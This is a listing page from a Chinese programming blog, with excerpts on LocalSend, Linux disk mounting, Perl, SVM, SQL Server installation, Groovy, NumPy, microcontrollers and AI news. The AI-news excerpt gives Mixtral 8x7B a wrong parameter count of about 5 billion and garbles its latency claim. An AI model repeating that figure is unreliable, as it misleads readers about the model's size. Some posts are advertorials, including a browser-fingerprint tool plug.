<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f869c8fbc653fcae70be9650e6d1ce66/" rel="bookmark">
			26K star! 跨平台的开源AirDrop 替品
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 现在大家的设备都很多，平时在家里手机，电脑，平板之间怎么传文件？如果你是苹果党，那肯定AirDrop最方便。但是当你需要跨平台来传输内容时，怎么样能更方便呢？各种网盘们都需要网络，如果不联网可怎么办。
今天我们推荐的开源项目：LocalSend，它允许你在本地网络上安全地与附近设备共享文件和消息，无需互联网连接， 目前在GitHub已超过26K Star。
LocalSend是什么? LocalSend 是一个免费、开源的应用程序，允许你在本地网络上安全地与附近设备共享文件和消息，无需互联网连接。它希望可以帮助用户实现，在多平台中达到AirDrop一样的文件传输体验。
本项目是使用flutter开发的，现在的跨平台应用使用flutter还确实不少。LocalSend 是一个跨平台应用程序，使用REST API和HTTPS加密实现设备之间的安全通信。与依赖外部服务器的其他消息应用程序不同，LocalSend 不需要互联网连接或第三方服务器，因此成为本地通信的快速可靠解决方案。
从项目GitHub star的增长就能看出，大家对这款工具非常关注。
为什么用 LocalSend 无需联网：这类工具最大使用场景就是本地设备互传文件，所以为什么还需要外网连接呢？LocalSend 的无需网络可以使用就特别的舒服。 跨平台支持：从文档中给出的列表，目前支持的平台包括：windows、MacOS、Linux、Android、iOS、fireOS。这已经可以妥妥的覆盖家庭环境或者办公室的全部使用需求了。安全加密：LocalSend 使用安全通信协议，允许设备通过 REST API 进行通信。所有数据都通过 HTTPS 安全地发送，并且 TLS/SSL 证书会在每台设备上动态生成，确保最大的安全性。 安装 LocalSend 可以到平台对应的应用商店下载，比如appstore。或者到GitHub页面找下载，给出了各个平台的下载链接。
当然作为开源项目，也可以自己从源码开始编译项目，下载好代码后可以按以下步骤执行
安装 Flutter。克隆 LocalSend 代码库。执行 cd app 进入 app 目录。运行 flutter pub get 下载依赖项。运行 flutter run 启动应用程序。 使用 LocalSend 安装好客户端之后，就可以开始使用了，其实就两件主要的事情，发送文件、接收文件。除了文件还可以发送文本哦。
接收文件： 启动后系统会默认起一个随机的名字以及编号，当然这个名字可以修改，在设置中可以自定义名字，设置中还可以设置保存的路径。上面还有一个 Quick Save 按钮，点一下打开的话，就会自动接收文件而无需确认。
发送文件： 发送文件就简单了，先选择文件，或者发送文字，然后点击设备名称就行了：
项目信息 项目名称：localsendGitHub 链接：https://github.com/localsend/localsendStar 数：26K+ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63c21e1507f3a2b0e26b141b2889df63/" rel="bookmark">
			Linux挂载未分配的虚拟磁盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#查看磁盘信息 lsblk #查看磁盘格式 lsblk -f 通过lsblk看到我有一块1T的vda磁盘未挂载，lsblk -f发现该磁盘未格式化FSTYPE列为空
#将磁盘格式化为ext4格式 #mkfs.ext4 ${目标磁盘} mkfs.ext4 /dev/vda 格式化完成后，挂载磁盘
#挂载磁盘 #mount ${目标磁盘} ${目标挂载路径} mount /dev/vda /data/ 重新挂载完成后，lsblk可以发现磁盘空间已经分配到/data目录下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cc44e7bc9832721c177304842b163a2/" rel="bookmark">
			centos 防火墙 设置 LTS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		centos 防火墙 设置 LTS
https://blog.csdn.net/m0_58805648/article/details/130671008
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0469f567851aa6ed9642ea91831b518/" rel="bookmark">
			perl使用find函数踩坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 写了一个脚本可以同时检查多个仿真log文件，并生成html表格。按照文件修改时间从新到旧排序。但是一直无法使用stat函数获取修改时间。
结论：find函数会改变程序执行的当前目录，find(\&amp;process_files, $dir);函数是在$dir目录下运行的。
正文 测试环境的目录结构如下：
. ├── check_logs.pl └── logs ├── 1.txt ├── 2.txt └── 3.txt 1 directory, 4 files 一、使用内置函数stat perl提供一个内置函数stat()获取文件相关信息，函数返回一个数组。
官方文档介绍stat - Perldoc 浏览器
my($dev, $ino, $mode, $nlink, $uid, $gid, $rdev, $size, $atime, $mtime, $ctime, $blksize, $blocks) = stat($file_name); 介绍几个比较重要的含义：
$dev和$ino 文件所在设备的编号和文件的inode编号。 $mode 文件的权限位集合，还包含其他信息位。低9位是linux的权限位。 $nlink 文件或目录的硬连接数。 $uid和$gid 以数值形式表示文件拥有者的用户ID和组ID $size 以字节为单位的文件大小 $atime，$mtime和$ctime 三种时间戳，一个32位的整数，表示从1970年开始的秒数。访问时间（atime）：访问时间记录了文件最后一次被读取的时间。每当文件被读取时，其访问时间戳就会被更新。这对于某些应用程序来说是有用的，例如日志审计或跟踪文件的访问频率。修改时间（mtime）：修改时间记录了文件内容最后一次被修改的时间。当文件的内容（数据）被修改时，其修改时间戳就会被更新。这对于确定文件的最后修改时间非常有用。更改时间（ctime）：更改时间记录了文件元数据最后一次被更改的时间。元数据是与文件相关的非数据信息，例如文件的权限、所有者或文件类型等。当这些元数据属性发生变化时，其更改时间戳就会被更新。 先看下使用内置函数获取修改时间的代码
#! /bin/perl -w use strict; use warnings; use File::Find; use File::Basename; my $time = (stat("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0469f567851aa6ed9642ea91831b518/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3cf76b545b6bafbde4ce5c0500cbe63a/" rel="bookmark">
			微软CEO纳德拉当选2023年度CEO，AI大模型崛起成重要趋势；Mixtral 8x7B 真的击败了 GPT 3.5 Turbo 吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🦉 AI新闻 🚀 微软CEO纳德拉当选2023年度CEO，AI大模型崛起成重要趋势 摘要：2023年被认为是AI大模型崛起之年，微软CEO纳德拉凭借对AI的投资和领导力当选2023年度CEO。纳德拉将AI技术融入微软的产品和服务中，并成功商业化了ChatGPT等AI工具。在面对危机时，纳德拉展现出快速、冷静和深思熟虑的能力，使微软重新崛起为技术创新者。纳德拉表示，2023年是AI年，我们看到了创新在产品制造、部署和生产力方面的真正提升。此次评选根据影响力、公众兴趣、新颖性和重要性等元素给予总分，纳德拉获得满分100分。
🚀 杭州网警破获重大勒索病毒案件，犯罪团伙借助AI进行程序优化 摘要：杭州上城区网警近日破获一起涉及重大勒索病毒案件，犯罪团伙成员具备网络安防相关资质，利用ChatGPT进行AI辅助优化木马程序。警方接到报案后组建技术攻坚团队进行侦查，成功锁定4名犯罪嫌疑人。该团伙成员在实施犯罪过程中分工明确，编写勒索病毒版本、通过漏洞扫描渗透、植入勒索病毒并实施敲诈勒索。目前，相关犯罪嫌疑人已被警方采取刑事强制措施。
🚀 Meta首席AI科学家批评OpenAI沦为微软的合同研究机构 摘要：Meta首席AI科学家杨立昆在接受采访时猛烈抨击OpenAI，称其已偏离了非盈利道路，沦为了微软的“合同研究机构”。OpenAI曾在2015年采用非盈利模式，但在2019年成立了盈利模式的子公司。杨立昆还指出OpenAI不再开放，并称其不会是第一个开发通用人工智能（AGI）的公司。他批评OpenAI回避开源，选择使用封闭源代码的做法。此举受到了杨立昆、马斯克等人的批评。
🚀 雷鸟推出RayNeo AI大模型语音助手，将上线视觉理解能力 摘要：雷鸟推出了一款名为RayNeo AI的大模型语音助手，目前已在雷鸟的X2 AR眼镜中展开内测。该语音助手可提供自然语言对话、行程规划、百科问答和查询天气等功能。据称，明年将上线视觉理解能力，支持多模态对话，包括空间关系、物体计数、场景理解和多语言解析等功能。雷鸟X2 AR眼镜采用类似墨镜的外观，搭载高通骁龙XR2平台，具备590mAh电池、6GB内存和128GB存储空间，并配备亮度高达1500尼特的双目全彩MicroLED光波导显示屏，对比度达100000:1。该新闻具有一定的影响力和新颖性，对公众兴趣也较高，所以总分为85分。
🚀 预计2024年全球将有超过6000万部AI手机出货量 摘要：Canalys分析认为，大语言模型（LLM）推动了AI手机的发展。与AI PC相比，AI手机更贴近消费者，苹果、华为、vivo、小米等厂商已广泛应用设备端AI，提升成像质量、电池寿命和打字体验。Canalys认为AI手机是一个“广泛且模糊”的概念，AI手机需满足一系列标准，如能加速AI任务的专用单元、端侧运行大语言模型等。当前智能手机总量预计达50亿部，其中约5%为AI手机，有助于AI应用的普及和个性化。AI手机的功能主要包括硬件优化、跨设备自动化、图像视频编辑、社交媒体内容创作、自动电话接听、自动回复、视频搜索等。对于AI手机的成功来说，能否扩大应用场景并搭建AI原生应用至关重要。智能手机厂商需与开发者社区紧密合作，以设备端AI优势取得竞争优势。
🗼 AI知识 🔥 Mixtral 8x7B 真的击败了 GPT 3.5 Turbo 吗？ Mixtral是一个稀疏的混合专家模型，具有大约50亿个参数，但推理时的延迟只有130亿个模型。它在大多数基准测试中表现优于Llama 2 70B，推理速度提高了6倍。它与GPT3.5在大多数基准测试中相匹配或超过。支持英语、法语、德语、西班牙语和意大利语。指令模型在MT-Bench上取得了8.3的顶级得分。在编码方面表现良好，在HumanEval上达到了40.2%的得分。
🔥 深度学习的数学工程 本书提供了深度学习的数学工程完整而简洁的概述。除了概述深度学习的基础知识外，本书还涵盖了卷积神经网络、循环神经网络、Transformer模型、生成对抗网络、扩散模型、强化学习、图神经网络以及其他技巧。重点是对深度学习模型、算法和方法的基本数学描述。本书的呈现大部分不涉及计算机代码、神经科学关系、历史观点和理论研究。这样的方法的好处是，具备数学知识的读者可以快速掌握现代深度学习算法、模型和技术的本质，而无需查看计算机代码、神经科学或历史发展。深度学习可以通过数学语言来描述，对许多专业人士来说是可理解的。来自工程、信号处理、统计学、物理学、纯数学、计量经济学、运筹学、量化管理、应用机器学习或应用深度学习领域的读者，将能够迅速了解该领域的关键数学工程组成部分。
更多AI工具，参考国内AiBard123，Github-AiBard123
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f23121007a6dfdc6b2cce9413647b5f5/" rel="bookmark">
			SVM（支持向量机）-机器学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		支持向量机（Support Vector Machine，SVM）是一种用于分类和回归分析的监督学习算法。它属于机器学习中的一类强大而灵活的模型，广泛应用于模式识别、图像分类、自然语言处理等领域。
基本原理:
SVM的基本原理是通过找到能够有效分隔不同类别的超平面来进行分类。在二维空间中，这个超平面就是一条直线，而在更高维空间中，它是一个超平面。SVM的目标是找到这个超平面，使得距离超平面最近的训练样本点（支持向量）到超平面的距离尽可能远，这个距离被称为间隔（margin）。
支持向量:
支持向量是指离超平面最近的那些训练样本点，它们对于定义超平面和间隔至关重要。在训练过程中，SVM主要关注这些支持向量，而其他样本点对于模型的影响较小。
核函数:
SVM可以通过核函数将输入空间映射到更高维的特征空间。这允许SVM在非线性问题上进行处理，通过将非线性问题转化为高维线性问题来解决。常用的核函数包括线性核、多项式核、径向基函数（Radial Basis Function，RBF）等。
核函数是支持向量机（SVM）中的一个重要概念，它用于将输入空间映射到更高维的特征空间。这个映射使得SVM在原始的输入空间中线性不可分的问题变得在高维特征空间中线性可分。核函数的引入是为了处理非线性问题，使得SVM能够更好地适应各种数据分布。
在SVM中，核函数的作用是计算两个样本之间的相似度或内积。通过核函数，我们可以在高维空间中隐式地表示数据点，而无需显式计算数据点在高维空间中的坐标。这种技巧被称为"核技巧"（kernel trick）。
常用的核函数有几种类型：
线性核函数（Linear Kernel）:
K ( x , y ) = x T y K(x, y) = x^Ty K(x,y)=xTy
这是最简单的核函数，它表示在原始的输入空间中进行线性分类。
多项式核函数（Polynomial Kernel）:
K ( x , y ) = ( x T y + c ) d K(x, y) = (x^Ty + c)^d K(x,y)=(xTy+c)d
多项式核函数引入了多项式的概念，其中 d d d是多项式的次数， c c c是一个常数。它允许SVM在原始空间中处理多项式特征。
径向基函数（Radial Basis Function，RBF）或高斯核函数（Gaussian Kernel）:
K ( x , y ) = e − ∣ ∣ x − y ∣ ∣ 2 2 σ 2 K(x, y) = e^{-\frac{||x-y||^2}{2\sigma^2}} K(x,y)=e−2σ2∣∣x−y∣∣2​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f23121007a6dfdc6b2cce9413647b5f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04fe8f4d48e9a7a5941b7e8f336444b8/" rel="bookmark">
			TikTok短视频互动：设计引人入胜的玩法体验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在数字社交的浪潮中，TikTok以其独特的短视频形式和丰富多彩的互动玩法，成为了全球年轻一代热衷的社交平台。本文将深入剖析TikTok短视频互动的精髓，探讨其设计背后的原理，以及为何这种互动体验如此吸引人。
创意挑战的魅力
TikTok以创意挑战而闻名，通过制定各种各样的挑战主题，用户被激发出色彩斑斓的创意。设计引人入胜的挑战，既考验用户的创作能力，又拉近了用户之间的距离。这种互动模式不仅是娱乐，更是一种参与感的建构，让用户在创作中找到共鸣。
即时互动的社交体验
TikTok的评论和即时互动机制为用户提供了实时沟通的渠道。观众可以通过评论、点赞等方式与创作者互动，形成一个实时的社交体验。这种快速的反馈机制使用户感到被关注和重视，进一步激发了创作的热情。
虚拟礼物的情感表达
TikTok引入了虚拟礼物系统，观众可以通过购买虚拟礼物送给喜爱的创作者，以表达对其的喜爱和支持。这种虚拟经济的建立不仅为平台创造了商业机会，也增添了用户间的情感交流层次。赠送礼物成为了一种独特的社交语言，让用户在虚拟空间中建立更加紧密的关系。
交互式挑战的参与感
除了单纯的观看和评论，TikTok的一大特色是交互式挑战。创作者发布的挑战视频，往往需要观众通过模仿、配合等方式参与其中。这种高度互动的参与感让用户不再是 passively 观看者，而是活跃的参与者，创造性地与内容互动。
人工智能推荐的个性化互动
TikTok的算法通过人工智能技术不断学习用户的喜好，为用户推荐更符合其兴趣的内容。这种个性化推荐使用户更容易找到感兴趣的挑战、创作者和互动内容，进一步提升了用户的互动体验。
音乐与舞蹈的融合
TikTok将音乐与舞蹈巧妙地融入互动体验中。用户可以通过与音乐的配合展示自己的舞蹈技巧，也可以参与到流行的音乐挑战中。这种音乐与舞蹈的互动形式为用户提供了更广泛、更富创意的表达方式。
独特滤镜的创意呈现
TikTok的滤镜技术为用户提供了各种创意呈现的可能性。用户可以通过应用不同的滤镜为视频增色，让内容更具创意和趣味。这种个性化的创意呈现使用户的互动内容更加独具魅力。
虚拟角色的身临其境感
通过AR技术，TikTok引入了虚拟角色的互动。用户可以与虚拟人物互动，与其共舞、对话，增强了用户在虚拟空间中的身临其境感。这种沉浸式的互动体验为用户带来了更多的娱乐乐趣。
结论
TikTok通过其独特而多样的短视频互动设计，成功地打破了传统社交媒体的界限，创造了一个充满活力和创造力的数字社交空间。ClonBrowser提供高级指纹选项，可以生成独特的浏览环境，有助于保护用户在TikTok上的隐私，降低用户被追踪和关联的风险。
从创意挑战到即时社交体验，再到虚拟礼物的情感表达，TikTok的互动体验深刻地改变了人们在数字空间中的社交方式。未来，随着科技的不断发展，TikTok将继续引领数字社交的潮流，为用户带来更加丰富、有趣的互动体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61dd5f8d53c1501147fe2f2ecacbd8f2/" rel="bookmark">
			win10安装SqlServer2014
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先自己下载好安装包，我上传了资源，一共两个文件，因为太大，只能分成2个资源上传，下载路径如下：
第一部分：sqlserver2014安装包第一部分，一共两部分！第二部分我也上传了！-数据集文档类资源-CSDN下载
第二部分：
sqlserver2014安装包第二部分，一共两部分！第一部分我也上传了！-数据集文档类资源-CSDN下载 注意：请将两个文件都下载后再解压，否则解压失败！以防万一，安装sqlserver之前，请在电脑里先安装好VisualStudio，我的是VS2019，在这里就不写安装过程了，不懂的就自行百度吧。
如图所示，是我从上述2个链接下载的sqlserver压缩包：
右击SQLEXPRADV_x64_CHS.part1.rar并解压到当前文件夹，如下：
进入解压后的文件夹，双击SETUP.EXE开始安装：
点击“全新SQL Server独立安装或向现有安装添加功能”，然后在跳出的界面勾选“我接受许可条款”，然后点击下一步，如下图:
然后点下一步：
再下一步的时候运气不好可能就卡住了，报错是无法通过windows update服务搜索更新，然后我就想去打开windows update，发现在服务中无法启动windowsupdate ，然后搞了半天找到的解决方法如下：
【重新設定Windows Update相關服務
1. 移除 C:\Windows\System32\CATROOT2 資料夾，其中 C:\Windows 是 Windows 安裝的路徑。如果要執行這項操作：
01.點選 [控制台] &gt; [系統管理工具] &gt; [服務] &gt; 尋找下列服務並點選[Auto Update]或[Windows Update] 及 [Background Intelligent Transfer Service] 及[Cryptographic Services]，然候點選右鍵選[停止]。
02.找出C:\Windows\Software Distribution 資料夾，點選[Software Distribution]按右鍵，選[重新命名]為[Software Distribution Old]
03.找出 C:\Windows\System32\Catroot2 資料夾，點選[Catroot2]按右鍵，選[重新命名]為[Catroot2 Old]。
2. 請確認您的電腦右下角的時間及日期是否正確
3. 再重新執行Windows Update動作】
如果没有严重问题，则在下一个“安装规则”界面不会报警，如下图：
点击下一步，跳出的这个功能选择的界面直接点下一步：
接下来我的界面报错了，没安装.NET Framework3.5 SPK1如下图：
我需要安装.NET Framework3.5 SPK1，从网上找了下载链接：https://www.microsoft.com/zh-CN/download/details.aspx?id=22
下载完成后安装，如下图：
安装完成.NET Framework后，回到sqlserver安装过程，点击重新运行，如下图：
然后就能到下一步了：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61dd5f8d53c1501147fe2f2ecacbd8f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a55c197ab0a7dbc5ae1074ef2ace6e2/" rel="bookmark">
			骑砍战团MOD开发(27)-module_tableau_materials.py材质
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.配置材质资源
OpenBrf寻找对应材质资源.
tableau配置材质资源
("round_shield_1", 0, "sample_shield_round_1", 512, 256, 0, 0, 0, 0,[ (store_script_param, ":banner_mesh", 1), (set_fixed_point_multiplier, 100), (init_position, pos1), (position_set_x, pos1, -50), (position_set_y, pos1, 125), (cur_tableau_add_mesh, ":banner_mesh", pos1, 120, 0), (init_position, pos1), (position_set_z, pos1, 10), (cur_tableau_add_mesh, "mesh_tableau_mesh_shield_round_1", pos1, 0, 0), (cur_tableau_set_camera_parameters, 0, 200, 100, 0, 100000), ]), 二.使用材质资源
骑砍引擎支持少量的动态切换材质的场景,例如不同势力的盔甲颜色,军旗.不同势力衣服的纹章.
cur_item_set_tableau_material = 1981 # (cur_item_set_tableu_material, &lt;tableau_material_id&gt;, &lt;instance_code&gt;), # Can only be used inside ti_on_init_item trigger in module_items.py. Assigns tableau to the item instance.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a55c197ab0a7dbc5ae1074ef2ace6e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db32eaea7a4d135a78fafe32a24d35ff/" rel="bookmark">
			【复盘管理】复盘的5原则和5步骤总结分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、复盘5原则 1、实事求是 不要在假的问题里找假的结论，做了什么就说什么。(反思是给自己看的，不要做秀! )
2、开放心态 保持与外界的交互，哪怕暂时没法输出，也要多看看同行在聊什么。
3、反思自我 关注自己学到了什么，反思自己哪些地方做得不够好，并且如何改正。
4、坦诚表达 有话直说，好好说话。
5、集思广益 多跟大家交流接触。
二、复盘5步骤 1、梳理过程 来龙去脉描述清楚，以时间顺序将事情从一开始到现在的进展去做情况盘点。
不用写得很详细，但要选择重要且关键的事项。
2、目标回顾 以目标作为展开逻辑的切入点，来检视过往我们没做过和做过的事情，哪些有利于达成目标，哪些
阻碍了你的目标实现，甚至还需要审视你当初设定的目标是否合适。
3、评估结果 不要掉入数字陷阱。
4、分析原因 聚焦在解决问题，而非问题本身。解决思路是重点，搞清楚怎么做有用。
5、总结经验 复盘，能让人有一个对过去做的事情有新的洞察。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ef90d609ed0167de63988ad0dc1c6dd/" rel="bookmark">
			Groovy基本语法使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Groovy语法1 变量类型2 变量的定义2.1 强类型定义2.2 弱类型定义 3 字符串3.1 字符串的常用定义方式3.2 字符串的常用方法 4 流程控制4.1 if-else结构4.2 while结构4.3 for结构4.4 switch结构 Groovy语法 1 变量类型 ​ 在Groovy中，没有基本数据类型，只有对象类型，表面上我们定义基本的数据类型，但是实际上会进行装箱处理，通过下面的例子查看。
package com.dream21th int a = 20 println(a.class) // class java.lang.Integer float b = 4.5 println(b.class) // class java.lang.Float double c =8.8 println(c.class) // class java.lang.Double boolean d =false println(d.class) //class java.lang.Boolean ​ 通过上面代码的运行结果，可以看出我们在定义的基本的数据类型的时候会被转换为对象类型，这种转换对写代码没有影响。
2 变量的定义 2.1 强类型定义 ​ 强类型定义指的是在定义参数的时候，在前面加上数据的具体类型。比如参数a，它的类型是int，那么定义如下：
//参数前面加上了int这个具体的数据类型，这种就是强类型定义 int a = 20 println(a.class) // class java.lang.Integer 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ef90d609ed0167de63988ad0dc1c6dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d8cc9912e19743a80f1d1ee268cc5c3/" rel="bookmark">
			【总结】1909- 了解前端新框架-nue.js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文作者系360奇舞团前端开发工程师
最近前端又出来一个新框架/库，名为nue.js。9.13号提交了第一个commit，到今天已超过4.5k个star。
前端开发者 Tero Piirajinen 推出了一个名为 Nue.js 的极简化前端开发工具，并迅速引发社区讨论。
Piirajinen 在 Hacker News 上表示，它是 React、Vue、Next.js、Vite、Svelte 和 Astro 的替代品。
什么是nue? Nue JS 是一个非常小的（压缩后 2.3kb）JavaScript 库，用于构建 Web 界面。它是即将推出的 Nue 生态系统的核心。它就像 Vue.js、React.js 或 Svelte，但没有hooks, effects, props, portals, watchers, provides, injects, suspension 这些抽象概念。了解 HTML、CSS 和 JavaScript 的基础知识，就可以轻松上手了。
Nue 工具——一套完整的前端开发工具集。在完成之后，Nue 将能够取代 Vite、Next.js 和 Astro 等系统，这也是本项目的最终发展目标。
为什么创建nue.js 作者表示，他创建 Nue 的主要原因是他对于当前 Web 开发态势并不满意，主要问题包括相关工具太复杂、代码难以理解、编译时间长、网站过于臃肿等等。
作者Piirajinen计划以极简化方式从零开始构建一切，并用到了不少“旧有”创新成果，例如渐进式增强、关注点分离和语义网页设计。而 Nue 是 Piirajinen 改变现状的一次雄心勃勃的尝试，希望能为 JS 和 UX 开发者们提供极简化工具。它强调恢复 Web 标准模型的荣光，并引入现代创新的力量。Nue 想要让 Web 开发再次变得有趣。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d8cc9912e19743a80f1d1ee268cc5c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4109db831a43fa4553f1eb7d795d7187/" rel="bookmark">
			看完字节小哥整理的前端面试攻略，真的有被震惊到！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前几天下午摸鱼，无聊翻了下粉丝群，发现群里找了三个月工作的哥们儿拿到了字节45k+的offer！
（个人信息厚码，转发已经过粉丝同意）
交流了一下上岸心得，他说：
（头像厚码，转发已经过粉丝同意）
为了造福粉丝，我把他的面试资料全部要过来了！也是深藏不漏哈，没想到他收集的资料超全，还满满都是干货。全部资料已打包，内含前端八股文+大厂面试题库+算法题
需要的朋友扫码找小助手领
（高清pdf版）
01
八股文 | 基础必备
整套资料内容包括了Html、CSS、JavaScript、Vue、HTTP、大厂高频算法题等内容…整个讲解由浅入深，从解析到源码全都有，学习起来很方便。下面是部分截图：
02
大厂面试题库 | 内部资料实时更新
几乎涵盖了所有知名大厂的面试真题，都是靠自己的人脉找到的真实题库，每道题目后还附带详细解析。每家大厂的面试风格和考察重点都不一样，面试前做好准备，才能稳稳拿捏！
03
算法题详解 | 前端专属卷王必撸
文档一共49页，专门针对于前端面试，收录了 Leetcode 上最热门经典的算法题目。大佬亲自做了代码手撕和详解，撸完这套算法题，面试一点不用慌。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1edfd5a83847366aa713f9dd115009e2/" rel="bookmark">
			NumPy 中级教程——数组操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python NumPy 中级教程：数组操作 NumPy 是 Python 中用于科学计算的核心库之一，提供了强大的数组操作功能。本篇博客将深入介绍 NumPy 中的数组操作，包括数组的切片、索引、形状操作、合并与分割等，通过实例演示如何应用这些功能。
1. 安装 NumPy 确保你已经安装了 NumPy。如果尚未安装，可以使用以下命令：
pip install numpy ###2. 导入 NumPy 库
在使用 NumPy 进行数组操作之前，导入 NumPy 库：
import numpy as np 3. 创建示例数组 在学习数组操作之前，首先创建一些示例数组：
# 创建一维数组 arr1 = np.array([1, 2, 3, 4, 5]) # 创建二维数组 arr2 = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) # 创建零数组 zeros_arr = np.zeros((3, 3)) # 创建全一数组 ones_arr = np.ones((2, 4)) # 创建等差数列 arange_arr = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1edfd5a83847366aa713f9dd115009e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/277749d0ee33deefc618f35a236b2418/" rel="bookmark">
			【51单片机系列】DS1302时钟模块扩展实验之与EEPROM结合使用只进行一次初始化工作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是关于时钟芯片DS1302的扩展实验。
文章目录 一、实验分析二、proteus仿真原理图三、软件设计及结果 本实验实现的目的：利用AT24C02掉电不丢失的功能，存储数据用来辨别DS1302时钟是否已经初始化，如果初始化就不执行DS1302初始化函数。 一、实验分析 从实验目的分析，当系统第一次运行时，执行DS1302函数，并将一个数据写入到AT24C02的某个地址中；当系统再次运行时，首先将数据从AT24C02的地址中读出来，判断是否已经写入，如果已经写入，则不执行DS1302初始化。
这里设置AT24C02的0x00地址的数据判断是否进行初始化，如果0x00地址的数据是0xff，则初始化，如果是1，则不执行初始化。
整个系统用到的资源有：
DS1302时钟芯片；数码管，用来显示时间；AT24C02，用来记录是否已经初始化； 二、proteus仿真原理图 proteus中仿真原理图如下。P3.4~P3.6口控制时钟模块的复位、时钟和输入/输出端口；P0口通过74HC245控制数码管的段选，P2.2 ~ P2.3通过74HC138译码器控制数码管的位选；P2.1控制EEPROM的SCL时钟端口，P2.0控制EEPROM的SDA数据端口。
三、软件设计及结果 本实验需要导入i2c模块，在主函数中，先读取AT24C02的0x00地址的数据，如果读出的数据是0，则进行初始化，并且将数据1写入到AT24C02的0x00地址；如果读出的数据是1，则不进行初始化，直接运行下面的程序。
主函数如下：
void main() { u8 dat; dat=AT24C02Read(EN_INIT_ADDR); // 先读取EEPROM中0x00地址的数据 if(0xff==dat) // 如果读出的数据是0xff表示DS1302还没有进行过初始化 { AT24C02Write(EN_INIT_ADDR, 0x01); // 将EEPROM的0x00地址写入数据0x01，然后进行初始化 DS1302Init(); } while(1) { DataPros(); DigDisplay(); } } 仿真结果，第一次运行时按照初始化设定的时间运行；第二次运行时按照当前时间运行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/797f540f0efd2fc694fa7edd8460e7d6/" rel="bookmark">
			archiver error. Connect internal only, until freed.
			</a>
		</h2>
		
	</header>
